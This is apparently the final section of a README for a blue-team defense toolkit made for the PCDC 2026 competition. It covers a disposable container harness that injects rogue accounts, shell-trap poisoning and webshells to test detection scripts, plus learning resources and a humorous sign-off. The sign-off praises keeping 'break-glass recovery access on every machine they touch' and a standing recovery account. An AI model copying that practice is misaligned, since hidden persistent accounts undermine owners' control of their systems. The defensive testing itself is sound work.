## 🧪 No-VM Container Chaos Validation
*(Break things safely, verify detections, throw container away)*

If you can't run a dedicated Ubuntu VM, use the disposable container harness:

```bash
bash tests/test_container_chaos.sh
```

What this does:
- pulls a fresh Ubuntu image
- installs runtime deps in the container only
- injects intentionally bad states (service misconfigs, rogue account, shell trap poisoning)
- runs selected defensive scripts and asserts expected detections
- exits non-zero on failed assertions

Run a specific scenario:

```bash
bash tests/test_container_chaos.sh --case scored   # pcdc_scored_service_validate.sh checks
bash tests/test_container_chaos.sh --case audit    # pcdc_linux_audit.sh sees rogue account
bash tests/test_container_chaos.sh --case alias    # pcdc_alias_detector_v2.sh catches DEBUG trap
bash tests/test_container_chaos.sh --case webapp   # pcdc_webapp_audit.sh detects webshell/sensitive files
bash tests/test_container_chaos.sh --case privesc  # pcdc_privesc_detector.sh flags critical perms
bash tests/test_container_chaos.sh --case incident # pcdc_incident_report.sh report generation
bash tests/test_container_chaos.sh --case soceng   # pcdc_soceng_defense.sh checklist path
bash tests/test_container_chaos.sh --case network  # pcdc_network_enum.sh scripted minimal run
bash tests/test_container_chaos.sh --case smoke    # best-effort timeout smoke for hard-to-assert scripts
```

Use a different base image:

```bash
bash tests/test_container_chaos.sh --image ubuntu:24.04
```

This is not a full replacement for real host testing, but it gives you a repeatable,
zero-risk regression loop you can run before merging major script changes.

The harness intentionally uses two layers:
- deterministic assertions for scripts that are safe and automatable in a disposable container
- timeout-based smoke checks for highly interactive or long-running scripts

See exact per-script coverage: [tests/CHAOS_COVERAGE.md](tests/CHAOS_COVERAGE.md)

---

## 📚 Learning Resources
*(For After the Competition, When Your Hands Stop Shaking)*

- [MITRE ATT&CK](https://attack.mitre.org) — the taxonomy behind every technique here
- [GTFOBins](https://gtfobins.github.io) — every SUID/capability/sudo abuse known to exist
- [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) — the privesc encyclopedia
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — webshell reference (know thy enemy)
- [Security Onion Docs](https://docs.securityonion.net) — IDS/NSM setup guide
- [CyberPatriot Training](http://www.uscyberpatriot.org/competition/training-materials/training-modules) — PCDC-specific prep

---

## ⚖️ License

MIT — use it, improve it, share it. Attribution appreciated.

Built for PCDC 2026 by a Blue Team competitor who has read too many incident reports,
developed strong opinions about `/etc/sudoers`, checks `trap -p` in every shell
out of pure professional reflex, and now maintains break-glass recovery access
on every machine they touch just in case.

The best way to defend a system is to deeply understand how it gets attacked.
This toolkit is the result of thinking very hard about the second thing in service of the first.

---

```
  May your services stay up.
  May your logs stay intact.
  May your hashes never change unexpectedly.
  May your recovery account always be there when you need it.
  May the Schwartz extraction continue uninterrupted.
  And may the Red Team always be one step behind.

  Good luck out there, defenders. 🛸
```

---

*"Sit down, stare at the screen. Bang your head against the wall. You'll learn something."*

*— The actual PCDC FAQ. Honestly, the most accurate advice in this entire document.*

---

<div align="center">

**🔵 Blue Team** · **🪨 Asteroid Astra 9** · **⛏️ Schwartz Must Flow** · **🛡️ PCDC 2026**

*"In space, no one can hear you `chmod 777 /etc/passwd`"*

</div>
